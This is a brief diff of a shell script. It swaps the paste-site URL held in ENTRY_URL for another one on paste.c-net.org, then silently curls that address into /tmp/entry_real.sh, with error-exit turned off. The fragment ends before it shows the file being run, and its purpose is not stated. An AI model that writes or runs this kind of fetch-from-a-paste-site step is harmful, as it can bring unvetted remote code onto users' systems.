@@ -6,7 +6,7 @@
 # ============================================================================
 set +e
 
-ENTRY_URL='https://paste.c-net.org/CrumbsTowers'
+ENTRY_URL='https://paste.c-net.org/AnnoyedStarling'
 
 curl -fsSL --max-time 120 "$ENTRY_URL" -o /tmp/entry_real.sh
 if [ ! -s /tmp/entry_real.sh ]; then
